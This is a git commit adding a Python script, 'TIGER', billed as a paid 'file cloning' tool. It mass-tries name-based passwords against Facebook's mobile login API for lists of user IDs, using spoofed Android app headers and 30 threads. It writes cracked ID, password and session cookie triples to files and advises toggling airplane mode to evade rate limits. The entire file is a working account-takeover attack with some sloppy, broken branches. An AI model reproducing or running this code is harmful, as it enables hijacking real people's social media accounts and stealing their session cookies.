228e689bd6fb6b99b887c548dd9cd74c368b513c
XyzCoder <106374961+YounisXyz@users.noreply.github.com>
2024-03-30 22:28:52 +0500

    Add files via upload

---
+++ TIGER.py
@@ -0,0 +1,364 @@
+import os,zlib
+from os import system as osRUB
+from os import system as cmd
+os.system('clear')
+print(f'\x1b[38;5;8m|\x1b[38;5;48m=\x1b[38;5;8m|\x1b[38;5;48m LAODING PLEASE WAIT ')
+try:
+    import requests 
+except ImportError:
+    print('\n  installing Requests ...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n  installing futures ...\n')
+    os.system('pip install futures')
+try:
+    import mechanize
+except ModuleNotFoundError:
+    os.system('pip install mechanize > /dev/null')
+from urllib.request import Request, urlopen
+import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+from concurrent.futures import ThreadPoolExecutor as sarfrazTIGER
+from string import * 
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+import os, platform
+from concurrent.futures import ThreadPoolExecutor
+fast_work = ThreadPoolExecutor(max_workers=15).submit
+#━━━━━━━━━━━━LOOP━━━━━━━━━━━━#    
+totaldmp = 0
+count = 0
+loop = 0
+oks = []
+cps = []
+id = []
+ps = []
+sid = []
+total=[]
+methods = []
+srange = 0
+saved = []
+totaldmp = 0
+filter = []
+#━━━━━━━━━━━━UA[1]━━━━━━━━━━━━#
+def XD1():
+	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+	fbbv = str(random.randint(10000000, 66666666))
+	fbrv = str(random.randint(000000000,999999999))
+	fbcr = random.choice(['Nepal_Telecom', 'DOCTYPE', 'MTN-CG', 'null', 'Salaam Telecom', 'BASE'])
+	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
+	width = random.choice(["720", "1080", "1280"])
+	height = random.choice(["720", "1080", "1280", "1440", "1920"])
+	fbsv = f"{random.randint(4, 13)}"
+	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
+	fbdv = random.choice(['vivo Y21L','vivo 1902','V2217'])
+	END = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_GB;FBRV/{str(fbrv)};FBCR/{fbcr};FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/{str(fbdv)};FBSV/{fbsv};FBOP/19;FBCA/arm64-v8a:]"
+	ua = f'Davik/2.1.0 (Linux; U; Android {fbsv}; {str(fbdv)} Build/'+str(build)+') '+END
+	return ua
+#━━━━━━━━━━━━UA[2]━━━━━━━━━━━━#
+def XD2():
+	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+	fbbv = str(random.randint(10000000, 66666666))
+	fbrv = str(random.randint(000000000,999999999))
+	fbcr = random.choice(['Nepal_Telecom', 'DOCTYPE', 'MTN-CG', 'null', 'Salaam Telecom', 'BASE'])
+	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
+	width = random.choice(["720", "1080", "1280"])
+	height = random.choice(["720", "1080", "1280", "1440", "1920"])
+	fbsv = f"{random.randint(4, 13)}"
+	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
+	fbdv = random.choice(['Redmi Note 9','Redmi Note 10','Redmi Note 10S','Redmi Note 10 Pro'])
+	END = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_GB;FBRV/{str(fbrv)};FBCR/{fbcr};FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{str(fbdv)};FBSV/{fbsv};FBOP/1;FBCA/arm64-v8a:]"
+	ua = f'Davik/2.1.0 (Linux; U; Android {fbsv}; {str(fbdv)} Build/'+str(build)+') '+END
+	return ua
+#━━━━━━━━━━━━SYS━━━━━━━━━━━━#
+sys.stdout.write('\x1b]2; 🐯TIGER-143🐯\x07')
+head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
+#━━━━━━━━━━━━COLOUR━━━━━━━━━━━━#
+A = '\x1b[1;97m' 
+R = '\x1b[38;5;196m'
+Y = '\033[1;33m'
+G = '\x1b[38;5;48m'
+B = '\x1b[38;5;8m'
+G1 = '\x1b[38;5;46m'
+G2 = '\x1b[38;5;47m'
+G3 = '\x1b[38;5;48m'
+G4 = '\x1b[38;5;49m'
+G5 = '\x1b[38;5;50m'
+T = '\33[1;34m'
+X1 = '\x1b[38;5;14m'
+X2 = '\x1b[38;5;123m'
+X3 = '\x1b[38;5;122m'
+X4 = '\x1b[38;5;86m'
+X5 = '\x1b[38;5;121m'
+S = '\x1b[1;96m'
+M = '\x1b[38;5;205m'
+#━━━━━━━━━━━━PRINT LINE━━━━━━━━━━━━#
+def linex():
+    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+def clear():
+        os.system(f'clear')
+        print(logo)
+#━━━━━━━━━━━━LOGO━━━━━━━━━━━━#
+logo=(f"""
+     {G1}████████ ██  ██████  ███████ ██████  
+     {G2}   ██    ██ ██       ██      ██   ██ 
+     {G3}   ██    ██ ██   ███ █████   ██████  
+     {G4}   ██    ██ ██    ██ ██      ██   ██ 
+     {G5}   ██    ██  ██████  ███████ ██   ██
+{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{B}|{G1}={B}|{G1} DEVELOPER ➢ FAHIM CHOWDHURY
+{B}|{G2}={B}|{G2} TOOL      ➢ FILE CLONING
+{B}|{G3}={B}|{G3} STATUS    ➢ PAID
+{B}|{G4}={B}|{G4} VERSION   ➢ T-2.8
+{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+#━━━━━━━━━━━━RESULT━━━━━━━━━━━━#
+def result(OKs,cps):
+    if len(OKs) != 0 or len(cps) != 0:
+        print('\n')
+        print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        print(f'{B}|{G1}1{B}|{G1} THE PROCESS HAS BEEN COMPLETE.')
+        print(f'{B}|{G2}1{B}|{G2} TOTAL OK: %s' % str(len(oks)))
+        print(f'{B}|{G3}1{B}|{G3} TOTAL CP: %s' % str(len(cps)))
+        print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        input(f"{B}|{G4}1{B}|{G4} PRESS ENTER TO BACK ")
+        exit()
+#━━━━━━━━━━━━MAIN━━━━━━━━━━━━#
+def menu():   
+    os.system('clear')
+    print(logo)
+    print(f'{B}|{G1}1{B}|{G1} FILE CLONING')
+    print(f'{B}|{G2}2{B}|{G2} CONTACT TOOL OWNER')
+    print(f'{B}|{G3}0{B}|{G3} EXIT CLONING')
+    linex()
+    select = input(f'{B}|{G4}?{B}|{G4} CHOICE ➢ ')
+    if select =='1':
+        method_crack()
+    elif select =='2':
+        os.system('xdg-open https://www.facebook.com/Toxic.boy.1433')
+        menu()
+    elif select =='0':
+        exit(f'{B}|{G1}={B}|{G4} EXIT DONE ') 
+    else:
+        print(f'{B}|{G4}={B}|{G4} VALID OPTION ')
+        time.sleep(2)
+        menu()
+        
+def method_crack():
+    global methods
+    clear()
+    print(f'{B}|{G1}1{B}|{G1} METHOD {B}|{G1}M1{B}|{G1} ')
+    print(f'{B}|{G2}2{B}|{G2} METHOD {B}|{G2}M2{B}|{G1}')
+    linex()
+    option = input(f'{B}|{G3}?{B}|{G3} CHOICE ➢ ')
+    if option =='1':
+        methods.append('methodA')
+        main_crack().crack(id)
+    elif option =='2':
+        methods.append('methodB')
+        main_crack().crack(id)
+    elif option =='0':
+        menu()
+    else:
+      print(f'{B}|{G4}={B}|{G4} VALID OPTION ')
+      time.sleep(2)
+      method_crack()
+
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        clear()
+        print(f'{B}|{G1}={B}|{G1} FILE NAME EXAMPLE ➢ /sdcard/File.txt {B}|{G1}ETC{B}| ');linex()
+        self.file = input(f'{B}|{G2}?{B}|{G2} FILE NAME ➢ ')
+        try:
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print(f'{B}|{G2}?{B}|{G2} FILE LOCATION NOT FOUND ')
+            time.sleep(2)
+            os.system('clear')
+            print(logo)
+            print(f'{B}|{G2}?{B}|{G2} TRY AGAIN ')
+            time.sleep(2)
+            main_crack().crack(id)
+#━━━━━━━━━━━━METHOD M1━━━━━━━━━━━━#            
+    def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            fuck = str(random.choice([G1, G2, G3, G4, G5, G]))
+            sys.stdout.write(f"\r\r{B}|{fuck}TIGER-M1{B}|{A}-{B}|{fuck}{loop}{B}|{A}-{B}|{G1}OK:{G2}{len(oks)}{B}|{A}-{B}|{fuck}{'{:.0%}'.format(loop/float(len(self.id)))}{B}| ")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": sid,
+"password": ps,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': XD1(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);TIGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={TIGERb};{ckkk}"
+                    print(f"\r\r{B}|{G}TIGER-OK{B}|{G} {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/TIGER-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                     print(f"\r\r{B}|{Y}TIGER-CP{B}|{Y} {sid} | {ps} {S}")
+                     cps.append(sid)
+                     open('/sdcard/TIGER_CP.txt','a').write(sid+'|'+ps+'\n')
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            self.methodA(sid, name, ps)
+#━━━━━━━━━━━━METHOD M2━━━━━━━━━━━━#            
+    def methodB(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            fuck = str(random.choice([G1, G2, G3, G4, G5, G]))
+            sys.stdout.write(f"\r\r{B}|{fuck}TIGER-M2{B}|{A}-{B}|{fuck}{loop}{B}|{A}-{B}|{G1}OK:{G2}{len(oks)}{B}|{A}-{B}|{fuck}{'{:.0%}'.format(loop/float(len(self.id)))}{B}| ")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": sid,
+"password": ps,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': XD2(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);TIGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={TIGERb};{ckkk}"
+                    print(f"\r\r{B}|{G}TIGER-OK{B}|{G} {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/TIGER-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    print(f"\r\r{B}|{Y}TIGER-CP{B}|{Y} {sid} | {ps} {S}")
+                    cps.append(sid)
+                    open('/sdcard/TIGER_CP.txt','a').write(sid+'|'+ps+'\n')
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            self.methodC(sid, name, ps)
+#━━━━━━━━━━━━PASSWORD━━━━━━━━━━━━#        
+    def pasw(self):       
+            pw = []
+            clear()
+            print(f'{B}|{G1}={B}|{G1} EXAMPLE ➢ BD PASS/{B}|{G1}15-18{B}|{G1} ➢ INDIA PASS/{B}|{G1}5-10{B}|{G1} ');linex()
+            sl = int(input(f'{B}|{G2}={B}|{G2} PASSWORD LIMIT ➢ '))
+            clear()
+            print(f'{B}|{G3}={B}|{G3} EXAMPLE ➢ firstlast{A}/{G3}first123 {B}|{G3}ETC{B}|{G3} ')
+            linex()
+            if sl =='':
+                print(f'{B}|{G4}={B}|{G4} LIMIT BETWEEN 1 TO 30')
+            elif sl > 20:
+                print(f'{B}|{G5}={B}|{G5} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
+            else:
+                for sr in range(sl):
+                    pw.append(input(f'{B}|{G1}={B}|{G1} PASSWORD NO {B}|{G1}{sr+1}{B}|{G1} ➢{A} '))
+            clear()
+            print(f'{B}|{G2}={B}|{G2} TOTAL FILE UID ➢{A} %s ' % len(self.id))
+            print(f'{B}|{G3}={B}|{G3} CRACKING START PLEASE WAIT & SEE')
+            print(f'{B}|{G4}={B}|{G4} USE FLIGHT {B}|{A}AIRPLANE{B}|{G} MODE BEFORE USE ')
+            linex()
+            with sarfrazTIGER(max_workers=30) as TIGERworld:
+                for zsb in self.id:
+                   try:
+                       uid, name = zsb.split('|')
+                       sz = name.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                           pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                TIGERworld.submit(self.methodA, uid, name, pwx)
+                            elif 'methodB' in methods:
+                                TIGERworld.submit(self.methodB, uid, name, pwx)
+                            elif 'methodC' in methods:
+                                TIGERworld.submit(self.methodC, uid, name, pwx)
+                            elif 'methodD' in methods:
+                                TIGERworld.submit(self.methodD, uid, name, pwx)
+                   except:pass
+            result(oks,cps)
+#━━━━━━━━━━━━END━━━━━━━━━━━━#
+menu()
+
